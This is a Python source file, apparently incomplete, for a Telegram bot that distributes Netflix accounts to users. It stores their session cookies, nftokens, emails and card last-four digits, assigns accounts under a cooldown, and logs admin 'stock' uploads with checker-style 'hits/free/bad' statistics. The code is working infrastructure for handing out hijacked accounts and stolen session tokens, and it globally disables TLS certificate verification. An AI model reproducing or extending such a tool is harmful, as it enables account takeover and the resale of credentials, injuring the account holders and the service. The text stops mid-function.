"""
SENZO NETFLIX BOT - PRODUCTION READY
Architecture: Clean, Modular, Scalable
Database: Turso (Persistent) + SQLite (Temporary)
Version: 3.0.0
Author: @Senzo268
"""

import sys
import asyncio
import json
import os
import re
import time
import ssl
import sqlite3
import threading
import zipfile
import io
import html
import logging
import traceback
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any, Union
from dataclasses import dataclass, asdict
from functools import wraps
from contextlib import contextmanager

# ============================================================
# ENVIRONMENT SETUP
# ============================================================
if sys.platform == "win32":
    try:
        if hasattr(sys.stdout, "reconfigure"):
            sys.stdout.reconfigure(encoding='utf-8')
        if hasattr(sys.stderr, "reconfigure"):
            sys.stderr.reconfigure(encoding='utf-8')
    except Exception:
        pass

import requests
import urllib3
from dotenv import load_dotenv
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    asyncio.get_running_loop()
except RuntimeError:
    asyncio.set_event_loop(asyncio.new_event_loop())

ssl._create_default_https_context = ssl._create_unverified_context

# ============================================================
# LIBSQL IMPORT
# ============================================================
HAS_LIBSQL = False
try:
    import libsql_experimental as libsql
    HAS_LIBSQL = True
except ImportError:
    try:
        import libsql
        HAS_LIBSQL = True
    except ImportError:
        pass

# ============================================================
# TELEGRAM IMPORTS
# ============================================================
from telegram import (
    Update, InlineKeyboardButton, InlineKeyboardMarkup,
    ChatMember, InputFile
)
from telegram.constants import ParseMode
from telegram.ext import (
    Application, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)

# ============================================================
# FLASK HEALTH CHECK
# ============================================================
from flask import Flask, jsonify

# ============================================================
# ENVIRONMENT VARIABLES
# ============================================================
load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN", "")
TURSO_DATABASE_URL = os.getenv("TURSO_DATABASE_URL", "")
TURSO_AUTH_TOKEN = os.getenv("TURSO_AUTH_TOKEN", "")
REPORT_CHANNEL_ID = os.getenv("REPORT_CHANNEL_ID", "")

ADMIN_IDS = [
    int(aid.strip()) 
    for aid in os.getenv("ADMIN_IDS", "").split(",") 
    if aid.strip().isdigit()
]

WORKING_COOLDOWN_MINUTES = int(os.getenv("COOLDOWN_MINUTES", 5))
MAX_ACCOUNTS_PER_USER = int(os.getenv("MAX_ACCOUNTS", 5))
MAX_CHECK_THREADS = int(os.getenv("MAX_THREADS", 20))
CHECK_TIMEOUT = int(os.getenv("CHECK_TIMEOUT", 20))
MAX_RETRIES = int(os.getenv("MAX_RETRIES", 3))

# ============================================================
# LOGGING CONFIGURATION
# ============================================================
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ============================================================
# FLASK APP
# ============================================================
flask_app = Flask(__name__)

@flask_app.route("/")
@flask_app.route("/health")
def health_check():
    return jsonify({
        "status": "online",
        "service": "Senzo Netflix Bot",
        "version": "3.0.0",
        "database": "Turso + SQLite",
        "developer": "@Senzo268",
        "timestamp": datetime.utcnow().isoformat()
    }), 200

def start_health_server():
    port = int(os.getenv("PORT", 8080))
    try:
        logging.getLogger('werkzeug').setLevel(logging.ERROR)
        flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
    except Exception as e:
        logger.error(f"Health server error: {e}")

# ============================================================
# DATA CLASSES
# ============================================================
@dataclass
class User:
    user_id: int
    username: str = ""
    first_name: str = ""
    joined_at: str = ""
    is_banned: bool = False
    is_admin: bool = False
    last_account_time: str = ""
    total_working: int = 0
    total_notworking: int = 0
    working_reports: int = 0
    notworking_reports: int = 0
    accounts_used: int = 0
    pending_report: bool = False
    pending_report_account_id: int = 0
    pending_report_type: str = ""
    warnings: int = 0

@dataclass
class Account:
    id: int = 0
    email: str = ""
    country: str = ""
    plan: str = ""
    cookies: str = ""
    nftoken: str = ""
    nftoken_expiry: str = ""
    assigned_to: int = 0
    assigned_at: str = ""
    is_working: bool = True
    status: str = "available"
    account_name: str = ""
    streams: int = 0
    quality: str = ""
    price: str = ""
    billing_date: str = ""
    profiles: str = ""
    user_guid: str = ""
    phone: str = ""
    extra_member: bool = False
    membership_status: str = ""

# ============================================================
# DATABASE MANAGER - CLEAN SINGLETON PATTERN
# ============================================================
class DatabaseManager:
    """Thread-safe database manager with dual connection support."""
    
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
                    cls._instance._initialize()
        return cls._instance
    
    def _initialize(self):
        self.turso_conn = None
        self.sqlite_conn = None
        self.use_turso = False
        self._turso_lock = threading.Lock()
        self._sqlite_lock = threading.Lock()
        
        self._connect_turso()
        self._connect_sqlite()
        
    def _connect_turso(self):
        """Establish Turso connection for persistent data."""
        if HAS_LIBSQL and TURSO_DATABASE_URL and TURSO_DATABASE_URL.startswith("libsql://"):
            try:
                if TURSO_AUTH_TOKEN:
                    self.turso_conn = libsql.connect(TURSO_DATABASE_URL, auth_token=TURSO_AUTH_TOKEN)
                else:
                    self.turso_conn = libsql.connect(TURSO_DATABASE_URL)
                self.use_turso = True
                logger.info("✅ Turso connected (Persistent)")
                self._init_turso_tables()
            except Exception as e:
                logger.error(f"⚠️ Turso failed: {e}")
                self.use_turso = False
    
    def _connect_sqlite(self):
        """Establish SQLite connection for temporary accounts."""
        try:
            self.sqlite_conn = sqlite3.connect("accounts.db", check_same_thread=False, timeout=30)
            self.sqlite_conn.execute('PRAGMA journal_mode=WAL')
            self.sqlite_conn.execute('PRAGMA synchronous=NORMAL')
            self.sqlite_conn.execute('PRAGMA cache_size=10000')
            self.sqlite_conn.execute('PRAGMA temp_store=MEMORY')
            logger.info("✅ SQLite connected (Accounts)")
            self._init_sqlite_tables()
        except Exception as e:
            logger.error(f"❌ SQLite error: {e}")
            raise
    
    def _init_turso_tables(self):
        """Initialize persistent tables in Turso."""
        if not self.turso_conn:
            return
            
        with self._turso_lock:
            cur = self.turso_conn.cursor()
            
            # Users table
            cur.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    joined_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    is_banned BOOLEAN DEFAULT 0,
                    is_admin BOOLEAN DEFAULT 0,
                    last_account_time TIMESTAMP,
                    total_working INT DEFAULT 0,
                    total_notworking INT DEFAULT 0,
                    working_reports INT DEFAULT 0,
                    notworking_reports INT DEFAULT 0,
                    accounts_used INT DEFAULT 0,
                    pending_report BOOLEAN DEFAULT 0,
                    pending_report_account_id INTEGER,
                    pending_report_type TEXT,
                    warnings INT DEFAULT 0
                )
            ''')
            
            # Reports table
            cur.execute('''
                CREATE TABLE IF NOT EXISTS reports (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    account_id INTEGER,
                    report_type TEXT,
                    screenshot_file_id TEXT,
                    status TEXT DEFAULT 'pending',
                    reported_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    reviewed_at TIMESTAMP,
                    admin_note TEXT,
                    admin_id INTEGER,
                    channel_post_id INTEGER
                )
            ''')
            
            # Messages table
            cur.execute('''
                CREATE TABLE IF NOT EXISTS messages (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    message TEXT,
                    admin_reply TEXT,
                    status TEXT DEFAULT 'pending',
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    replied_at TIMESTAMP
                )
            ''')
            
            # Channels table
            cur.execute('''
                CREATE TABLE IF NOT EXISTS channels (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    channel_id TEXT UNIQUE,
                    channel_name TEXT,
                    invite_link TEXT,
                    is_active BOOLEAN DEFAULT 1
                )
            ''')
            
            # Stock logs table
            cur.execute('''
                CREATE TABLE IF NOT EXISTS stock_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    admin_id INTEGER,
                    file_name TEXT,
                    total_found INT,
                    valid_found INT,
                    uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Settings table
            cur.execute('''
                CREATE TABLE IF NOT EXISTS settings (
                    key TEXT PRIMARY KEY,
                    value TEXT,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Stats table
            cur.execute('''
                CREATE TABLE IF NOT EXISTS stats (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    date DATE UNIQUE,
                    total_hits INT DEFAULT 0,
                    total_free INT DEFAULT 0,
                    total_bad INT DEFAULT 0
                )
            ''')
            
            # Ban logs table
            cur.execute('''
                CREATE TABLE IF NOT EXISTS ban_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    admin_id INTEGER,
                    reason TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Warning logs table
            cur.execute('''
                CREATE TABLE IF NOT EXISTS warning_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    admin_id INTEGER,
                    reason TEXT,
                    warning_number INT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            self.turso_conn.commit()
            logger.info("✅ Turso tables initialized")
    
    def _init_sqlite_tables(self):
        """Initialize accounts table in SQLite."""
        if not self.sqlite_conn:
            return
            
        with self._sqlite_lock:
            cur = self.sqlite_conn.cursor()
            
            cur.execute('''
                CREATE TABLE IF NOT EXISTS accounts (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    email TEXT,
                    country TEXT,
                    plan TEXT,
                    cookies TEXT,
                    nftoken TEXT,
                    nftoken_expiry TEXT,
                    assigned_to INTEGER,
                    assigned_at TIMESTAMP,
                    is_working BOOLEAN DEFAULT 1,
                    status TEXT DEFAULT 'available',
                    source_file TEXT,
                    uploaded_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_checked TIMESTAMP,
                    report_count INT DEFAULT 0,
                    account_name TEXT,
                    streams INT,
                    quality TEXT,
                    price TEXT,
                    billing_date TEXT,
                    member_since TEXT,
                    payment_method TEXT,
                    card_last4 TEXT,
                    phone TEXT,
                    extra_member BOOLEAN DEFAULT 0,
                    membership_status TEXT,
                    email_verified BOOLEAN DEFAULT 0,
                    profiles TEXT,
                    user_guid TEXT,
                    working_confirmed BOOLEAN DEFAULT 0
                )
            ''')
            
            # Create indexes for performance
            cur.execute('CREATE INDEX IF NOT EXISTS idx_accounts_status ON accounts(status, is_working)')
            cur.execute('CREATE INDEX IF NOT EXISTS idx_accounts_assigned ON accounts(assigned_to)')
            
            self.sqlite_conn.commit()
            logger.info("✅ SQLite accounts table initialized")
    
    @contextmanager
    def turso_cursor(self):
        """Context manager for Turso cursor."""
        if not self.turso_conn:
            raise RuntimeError("Turso connection not available")
        with self._turso_lock:
            cur = self.turso_conn.cursor()
            try:
                yield cur
            finally:
                pass  # LibSQL cursors don't need explicit closing
    
    @contextmanager
    def sqlite_cursor(self):
        """Context manager for SQLite cursor."""
        if not self.sqlite_conn:
            raise RuntimeError("SQLite connection not available")
        with self._sqlite_lock:
            cur = self.sqlite_conn.cursor()
            try:
                yield cur
            finally:
                pass
    
    def execute_turso(self, query: str, params: Optional[tuple] = None) -> Any:
        """Execute query on Turso."""
        with self.turso_cursor() as cur:
            if params:
                cur.execute(query, params)
            else:
                cur.execute(query)
            return cur
    
    def execute_sqlite(self, query: str, params: Optional[tuple] = None) -> Any:
        """Execute query on SQLite."""
        with self.sqlite_cursor() as cur:
            if params:
                cur.execute(query, params)
            else:
                cur.execute(query)
            return cur
    
    def commit_turso(self):
        """Commit Turso transaction."""
        if self.turso_conn:
            with self._turso_lock:
                self.turso_conn.commit()
    
    def commit_sqlite(self):
        """Commit SQLite transaction."""
        if self.sqlite_conn:
            with self._sqlite_lock:
                self.sqlite_conn.commit()

# ============================================================
# UTILITY FUNCTIONS
# ============================================================
def safe_str(value: Any, default: str = "Unknown") -> str:
    """Safely convert value to string."""
    if value is None:
        return default
    s = str(value).strip()
    return s if s else default

def safe_int(value: Any, default: int = 0) -> int:
    """Safely convert value to integer."""
    try:
        return int(value)
    except (ValueError, TypeError):
        return default

def safe_bool(value: Any) -> bool:
    """Safely convert value to boolean."""
    if isinstance(value, bool):
        return value
    if isinstance(value, (int, float)):
        return bool(value)
    if isinstance(value, str):
        return value.lower() in ("true", "yes", "1", "on", "t")
    return False

def html_escape(text: Any) -> str:
    """Escape HTML for Telegram messages."""
    return html.escape(safe_str(text, default=""))

def is_admin(user_id: int) -> bool:
    """Check if user is an admin."""
    return user_id in ADMIN_IDS

def get_timestamp() -> str:
    """Get current timestamp in UTC."""
    return datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

# ============================================================
# DATABASE REPOSITORY LAYER
# ============================================================
class UserRepository:
    """Repository for user operations."""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get(self, user_id: int) -> User:
        """Get user by ID."""
        try:
            cur = self.db.execute_turso('SELECT * FROM users WHERE user_id = ?', (user_id,))
            row = cur.fetchone()
            if row:
                return User(
                    user_id=row[0],
                    username=safe_str(row[1]),
                    first_name=safe_str(row[2]),
                    joined_at=safe_str(row[3]),
                    is_banned=safe_bool(row[4]),
                    is_admin=safe_bool(row[5]),
                    last_account_time=safe_str(row[6]),
                    total_working=safe_int(row[7]),
                    total_notworking=safe_int(row[8]),
                    working_reports=safe_int(row[9]),
                    notworking_reports=safe_int(row[10]),
                    accounts_used=safe_int(row[11]),
                    pending_report=safe_bool(row[12]),
                    pending_report_account_id=safe_int(row[13]),
                    pending_report_type=safe_str(row[14]),
                    warnings=safe_int(row[15])
                )
        except Exception as e:
            logger.error(f"UserRepository.get error: {e}")
        return User(user_id=user_id)
    
    def create_or_update(self, user_id: int, username: str = "", first_name: str = "") -> bool:
        """Create or update user."""
        try:
            is_admin_flag = 1 if user_id in ADMIN_IDS else 0
            self.db.execute_turso('''
                INSERT OR REPLACE INTO users 
                (user_id, username, first_name, is_admin, pending_report, warnings)
                VALUES (?, ?, ?, ?, 0, 0)
            ''', (user_id, safe_str(username), safe_str(first_name), is_admin_flag))
            self.db.commit_turso()
            return True
        except Exception as e:
            logger.error(f"UserRepository.create_or_update error: {e}")
            return False
    
    def get_all(self) -> List[User]:
        """Get all users."""
        try:
            cur = self.db.execute_turso('''
                SELECT user_id, username, first_name, is_banned, warnings, accounts_used 
                FROM users ORDER BY joined_at DESC
            ''')
            rows = cur.fetchall()
            return [
                User(
                    user_id=r[0],
                    username=safe_str(r[1]),
                    first_name=safe_str(r[2]),
                    is_banned=safe_bool(r[3]),
                    warnings=safe_int(r[4]),
                    accounts_used=safe_int(r[5])
                )
                for r in rows
            ]
        except Exception as e:
            logger.error(f"UserRepository.get_all error: {e}")
            return []
    
    def get_banned(self) -> List[Tuple]:
        """Get all banned users."""
        try:
            cur = self.db.execute_turso('SELECT user_id, username, first_name FROM users WHERE is_banned = 1')
            return cur.fetchall()
        except Exception as e:
            logger.error(f"UserRepository.get_banned error: {e}")
            return []
    
    def ban(self, user_id: int, admin_id: int, reason: str) -> bool:
        """Ban a user."""
        try:
            self.db.execute_turso('UPDATE users SET is_banned = 1 WHERE user_id = ?', (user_id,))
            self.db.execute_turso('''
                INSERT INTO ban_logs (user_id, admin_id, reason) VALUES (?, ?, ?)
            ''', (user_id, admin_id, reason))
            self.db.commit_turso()
            return True
        except Exception as e:
            logger.error(f"UserRepository.ban error: {e}")
            return False
    
    def unban(self, user_id: int) -> bool:
        """Unban a user."""
        try:
            self.db.execute_turso('UPDATE users SET is_banned = 0, warnings = 0 WHERE user_id = ?', (user_id,))
            self.db.commit_turso()
            return True
        except Exception as e:
            logger.error(f"UserRepository.unban error: {e}")
            return False
    
    def add_warning(self, user_id: int, admin_id: int, reason: str) -> int:
        """Add warning to user and return warning count."""
        try:
            cur = self.db.execute_turso('SELECT warnings FROM users WHERE user_id = ?', (user_id,))
            row = cur.fetchone()
            warnings = (row[0] if row else 0) + 1
            
            self.db.execute_turso('UPDATE users SET warnings = ? WHERE user_id = ?', (warnings, user_id))
            self.db.execute_turso('''
                INSERT INTO warning_logs (user_id, admin_id, reason, warning_number)
                VALUES (?, ?, ?, ?)
            ''', (user_id, admin_id, reason, warnings))
            self.db.commit_turso()
            
            # Auto-ban at 3 warnings
            if warnings >= 3:
                self.ban(user_id, admin_id, "3 warnings - Auto ban")
            
            return warnings
        except Exception as e:
            logger.error(f"UserRepository.add_warning error: {e}")
            return 0
    
    def update_cooldown(self, user_id: int) -> bool:
        """Update user's last account time."""
        try:
            self.db.execute_turso('''
                UPDATE users 
                SET last_account_time = CURRENT_TIMESTAMP, accounts_used = accounts_used + 1
                WHERE user_id = ?
            ''', (user_id,))
            self.db.commit_turso()
            return True
        except Exception as e:
            logger.error(f"UserRepository.update_cooldown error: {e}")
            return False
    
    def find_by_query(self, query: str) -> Optional[User]:
        """Find user by ID or username."""
        try:
            q = query.strip().lstrip('@')
            if q.isdigit():
                return self.get(int(q))
            cur = self.db.execute_turso('SELECT user_id FROM users WHERE LOWER(username) = LOWER(?)', (q,))
            row = cur.fetchone()
            if row:
                return self.get(row[0])
        except Exception as e:
            logger.error(f"UserRepository.find_by_query error: {e}")
        return None

class AccountRepository:
    """Repository for account operations."""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get_available(self, plan_filter: Optional[str] = None) -> List[Account]:
        """Get all available accounts."""
        try:
            if plan_filter:
                cur = self.db.execute_sqlite('''
                    SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry, status,
                           account_name, streams, quality, price, billing_date, profiles,
                           user_guid, phone, extra_member, membership_status
                    FROM accounts 
                    WHERE status = 'available' AND is_working = 1 AND UPPER(plan) = UPPER(?) 
                    ORDER BY id ASC
                ''', (plan_filter,))
            else:
                cur = self.db.execute_sqlite('''
                    SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry, status,
                           account_name, streams, quality, price, billing_date, profiles,
                           user_guid, phone, extra_member, membership_status
                    FROM accounts 
                    WHERE status = 'available' AND is_working = 1 
                    ORDER BY id ASC
                ''')
            rows = cur.fetchall()
            return [
                Account(
                    id=r[0],
                    email=safe_str(r[1]),
                    country=safe_str(r[2]),
                    plan=safe_str(r[3]),
                    cookies=safe_str(r[4]),
                    nftoken=safe_str(r[5]),
                    nftoken_expiry=safe_str(r[6]),
                    status=safe_str(r[7]),
                    account_name=safe_str(r[8]),
                    streams=safe_int(r[9]),
                    quality=safe_str(r[10]),
                    price=safe_str(r[11]),
                    billing_date=safe_str(r[12]),
                    profiles=safe_str(r[13]),
                    user_guid=safe_str(r[14]),
                    phone=safe_str(r[15]),
                    extra_member=safe_bool(r[16]),
                    membership_status=safe_str(r[17])
                )
                for r in rows
            ]
        except Exception as e:
            logger.error(f"AccountRepository.get_available error: {e}")
            return []
    
    def get_total(self) -> Dict[str, Union[int, Dict]]:
        """Get total account count and breakdown."""
        try:
            cur = self.db.execute_sqlite('SELECT COUNT(*) FROM accounts WHERE status = "available" AND is_working = 1')
            total = cur.fetchone()[0] or 0
            
            cur = self.db.execute_sqlite('''
                SELECT plan, COUNT(*) FROM accounts 
                WHERE status = 'available' AND is_working = 1 
                GROUP BY plan
            ''')
            plan_counts = {safe_str(r[0]): safe_int(r[1]) for r in cur.fetchall()}
            
            return {"total": total, "plans": plan_counts}
        except Exception as e:
            logger.error(f"AccountRepository.get_total error: {e}")
            return {"total": 0, "plans": {}}
    
    def assign(self, user_id: int) -> Optional[Account]:
        """Assign an account to a user."""
        try:
            accounts = self.get_available()
            if not accounts:
                return None
            
            account = accounts[0]
            
            # Release any existing assigned accounts
            self.db.execute_sqlite('''
                UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = 'available' 
                WHERE assigned_to = ?
            ''', (user_id,))
            
            # Assign this account
            cur = self.db.execute_sqlite('''
                UPDATE accounts 
                SET assigned_to = ?, assigned_at = CURRENT_TIMESTAMP, status = 'assigned' 
                WHERE id = ? AND status = 'available'
            ''', (user_id, account.id))
            
            if cur.rowcount > 0:
                self.db.commit_sqlite()
                # Update user cooldown
                user_repo = UserRepository(self.db)
                user_repo.update_cooldown(user_id)
                return account
            
            self.db.commit_sqlite()
            return None
        except Exception as e:
            logger.error(f"AccountRepository.assign error: {e}")
            return None
    
    def get_assigned(self, user_id: int) -> Optional[Account]:
        """Get user's assigned account."""
        try:
            cur = self.db.execute_sqlite('''
                SELECT id, email, country, plan, cookies, nftoken, nftoken_expiry,
                       account_name, streams, quality, price, billing_date, profiles,
                       user_guid, phone, extra_member, membership_status
                FROM accounts 
                WHERE assigned_to = ? AND status = 'assigned' 
                ORDER BY assigned_at DESC LIMIT 1
            ''', (user_id,))
            row = cur.fetchone()
            if row:
                return Account(
                    id=row[0],
                    email=safe_str(row[1]),
                    country=safe_str(row[2]),
                    plan=safe_str(row[3]),
                    cookies=safe_str(row[4]),
                    nftoken=safe_str(row[5]),
                    nftoken_expiry=safe_str(row[6]),
                    account_name=safe_str(row[7]),
                    streams=safe_int(row[8]),
                    quality=safe_str(row[9]),
                    price=safe_str(row[10]),
                    billing_date=safe_str(row[11]),
                    profiles=safe_str(row[12]),
                    user_guid=safe_str(row[13]),
                    phone=safe_str(row[14]),
                    extra_member=safe_bool(row[15]),
                    membership_status=safe_str(row[16])
                )
        except Exception as e:
            logger.error(f"AccountRepository.get_assigned error: {e}")
        return None
    
    def release(self, account_id: int) -> bool:
        """Release account back to pool."""
        try:
            self.db.execute_sqlite('''
                UPDATE accounts SET assigned_to = NULL, assigned_at = NULL, status = 'available' 
                WHERE id = ?
            ''', (account_id,))
            self.db.commit_sqlite()
            return True
        except Exception as e:
            logger.error(f"AccountRepository.release error: {e}")
            return False
    
    def delete(self, account_id: int) -> bool:
        """Delete account."""
        try:
            self.db.execute_sqlite('DELETE FROM accounts WHERE id = ?', (account_id,))
            self.db.commit_sqlite()
            return True
        except Exception as e:
            logger.error(f"AccountRepository.delete error: {e}")
            return False
    
    def clear_all(self, plan_filter: Optional[str] = None) -> int:
        """Clear all accounts."""
        try:
            if plan_filter:
                cur = self.db.execute_sqlite('DELETE FROM accounts WHERE UPPER(plan) = UPPER(?)', (plan_filter,))
            else:
                cur = self.db.execute_sqlite('DELETE FROM accounts')
            self.db.commit_sqlite()
            return cur.rowcount
        except Exception as e:
            logger.error(f"AccountRepository.clear_all error: {e}")
            return 0
    
    def save_batch(self, accounts: List[Dict]) -> int:
        """Save multiple accounts."""
        if not accounts:
            return 0
        
        saved = 0
        try:
            before_cur = self.db.execute_sqlite('SELECT COUNT(*) FROM accounts')
            before = before_cur.fetchone()[0] or 0
            logger.info(f"📊 Before insert: {before} accounts")
            
            for a in accounts:
                try:
                    self.db.execute_sqlite('''
                        INSERT INTO accounts (
                            email, country, plan, cookies, nftoken, nftoken_expiry,
                            source_file, last_checked, account_name, streams, quality,
                            price, billing_date, member_since, payment_method, card_last4,
                            phone, extra_member, membership_status, email_verified,
                            profiles, user_guid, working_confirmed, status, is_working
                        ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 0, 'available', 1)
                    ''', (
                        safe_str(a.get("email")),
                        safe_str(a.get("country")),
                        safe_str(a.get("plan")),
                        safe_str(a.get("cookies")),
                        safe_str(a.get("nftoken")),
                        safe_str(a.get("nftoken_expiry")),
                        safe_str(a.get("source_file")),
                        get_timestamp(),
                        safe_str(a.get("account_name")),
                        safe_int(a.get("streams")),
                        safe_str(a.get("quality")),
                        safe_str(a.get("price")),
                        safe_str(a.get("billing_date")),
                        safe_str(a.get("member_since")),
                        safe_str(a.get("payment_method")),
                        safe_str(a.get("card_last4")),
                        safe_str(a.get("phone")),
                        1 if safe_bool(a.get("extra_member")) else 0,
                        safe_str(a.get("membership_status")),
                        1 if safe_bool(a.get("email_verified")) else 0,
                        safe_str(a.get("profiles")),
                        safe_str(a.get("user_guid")),
                    ))
                    saved += 1
                except Exception as e:
                    logger.error(f"Failed to save account: {e}")
                    continue
            
            self.db.commit_sqlite()
            
            after_cur = self.db.execute_sqlite('SELECT COUNT(*) FROM accounts')
            after = after_cur.fetchone()[0] or 0
            logger.info(f"📊 After insert: {after} accounts")
            logger.info(f"✅ Saved: {saved} accounts")
            
            return saved
        except Exception as e:
            logger.error(f"AccountRepository.save_batch error: {e}")
            return 0

class ReportRepository:
    """Repository for report operations."""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def create(self, user_id: int, account_id: int, report_type: str, screenshot_file_id: str) -> int:
        """Create a new report."""
        try:
            cur = self.db.execute_turso('''
                INSERT INTO reports (user_id, account_id, report_type, screenshot_file_id)
                VALUES (?, ?, ?, ?)
            ''', (user_id, account_id, report_type, screenshot_file_id))
            report_id = cur.lastrowid
            
            # Update user stats
            if report_type == "working":
                self.db.execute_turso('UPDATE users SET working_reports = working_reports + 1 WHERE user_id = ?', (user_id,))
            else:
                self.db.execute_turso('UPDATE users SET notworking_reports = notworking_reports + 1 WHERE user_id = ?', (user_id,))
            
            self.db.execute_turso('''
                UPDATE users 
                SET pending_report = 0, pending_report_account_id = NULL, pending_report_type = NULL
                WHERE user_id = ?
            ''', (user_id,))
            self.db.commit_turso()
            
            return report_id
        except Exception as e:
            logger.error(f"ReportRepository.create error: {e}")
            return 0
    
    def get_pending(self) -> List[Dict]:
        """Get pending reports."""
        try:
            cur = self.db.execute_turso('''
                SELECT r.id, r.user_id, r.account_id, r.report_type, 
                       r.screenshot_file_id, r.reported_at, u.username, a.email
                FROM reports r
                LEFT JOIN users u ON r.user_id = u.user_id
                LEFT JOIN accounts a ON r.account_id = a.id
                WHERE r.status = 'pending' 
                ORDER BY r.id DESC
            ''')
            rows = cur.fetchall()
            return [
                {
                    "id": r[0],
                    "user_id": r[1],
                    "account_id": r[2],
                    "report_type": safe_str(r[3]),
                    "screenshot": safe_str(r[4]),
                    "time": safe_str(r[5]),
                    "username": safe_str(r[6]),
                    "email": safe_str(r[7])
                }
                for r in rows
            ]
        except Exception as e:
            logger.error(f"ReportRepository.get_pending error: {e}")
            return []
    
    def confirm_working(self, report_id: int, account_id: int, admin_id: int) -> bool:
        """Confirm account is working."""
        try:
            self.db.execute_turso('''
                UPDATE reports SET status = 'accepted', reviewed_at = CURRENT_TIMESTAMP, admin_id = ? 
                WHERE id = ?
            ''', (admin_id, report_id))
            self.db.commit_turso()
            return True
        except Exception as e:
            logger.error(f"ReportRepository.confirm_working error: {e}")
            return False

class ChannelRepository:
    """Repository for channel operations."""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def get_active(self) -> List[Tuple]:
        """Get active channels."""
        try:
            cur = self.db.execute_turso('SELECT channel_id, channel_name, invite_link FROM channels WHERE is_active = 1')
            return cur.fetchall()
        except Exception as e:
            logger.error(f"ChannelRepository.get_active error: {e}")
            return []
    
    def add(self, channel_id: str, channel_name: str, invite_link: str) -> bool:
        """Add a channel."""
        try:
            self.db.execute_turso('''
                INSERT OR REPLACE INTO channels (channel_id, channel_name, invite_link) 
                VALUES (?, ?, ?)
            ''', (channel_id, channel_name, invite_link))
            self.db.commit_turso()
            return True
        except Exception as e:
            logger.error(f"ChannelRepository.add error: {e}")
            return False
    
    def remove(self, channel_id: int) -> bool:
        """Remove a channel."""
        try:
            self.db.execute_turso('DELETE FROM channels WHERE id = ?', (channel_id,))
            self.db.commit_turso()
            return True
        except Exception as e:
            logger.error(f"ChannelRepository.remove error: {e}")
            return False

class StatsRepository:
    """Repository for statistics operations."""
    
    def __init__(self, db: DatabaseManager):
        self.db = db
    
    def log_stock(self, admin_id: int, file_name: str, total: int, valid: int) -> bool:
        """Log stock upload."""
        try:
            self.db.execute_turso('''
                INSERT INTO stock_logs (admin_id, file_name, total_found, valid_found) 
                VALUES (?, ?, ?, ?)
            ''', (admin_id, file_name, total, valid))
            self.db.commit_turso()
            return True
        except Exception as e:
            logger.error(f"StatsRepository.log_stock error: {e}")
            return False
    
    def get_stock_logs(self, limit: int = 20) -> List[Dict]:
        """Get stock upload history."""
        try:
            cur = self.db.execute_turso('''
                SELECT id, admin_id, file_name, total_found, valid_found, uploaded_at 
                FROM stock_logs ORDER BY id DESC LIMIT ?
            ''', (limit,))
            rows = cur.fetchall()
            return [
                {
                    "id": r[0],
                    "admin_id": r[1],
                    "file_name": safe_str(r[2]),
                    "total": safe_int(r[3]),
                    "valid": safe_int(r[4]),
                    "time": safe_str(r[5])
                }
                for r in rows
            ]
        except Exception as e:
            logger.error(f"StatsRepository.get_stock_logs error: {e}")
            return []
    
    def log_daily(self, hits: int = 0, free: int = 0, bad: int = 0) -> bool:
        """Update daily stats."""
        try:
            cur = self.db.execute_turso('SELECT id FROM stats WHERE date = CURRENT_DATE')
            row = cur.fetchone()
            if row:
                self.db.execute_turso('''
                    UPDATE stats 
                    SET total_hits = total_hits + ?, total_free = total_free + ?, total_bad = total_bad + ?
                    WHERE date = CURRENT_DATE
                ''', (hits, free, bad))
            else:
                self.db.execute_turso('''
                    INSERT INTO stats (date, total_hits, total_free, total_bad)
                    VALUES (CURRENT_DATE, ?, ?, ?)
                ''', (hits, free, bad))
            self.db.commit_turso()
            return True
        except Exception as e:
            logger.error(f"StatsRepository.log_daily error: {e}")
            return False
    
    def get_today(self) -> Dict[str, int]:
        """Get today's stats."""
        try:
            cur = self.db.execute_turso('SELECT total_hits, total_free, total_bad FROM stats WHERE date = CURRENT_DATE')
            row = cur.fetchone()
            if row:
                return {"hits": row[0] or 0, "free": row[1] or 0, "bad": row[2] or 0}
        except Exception as e:
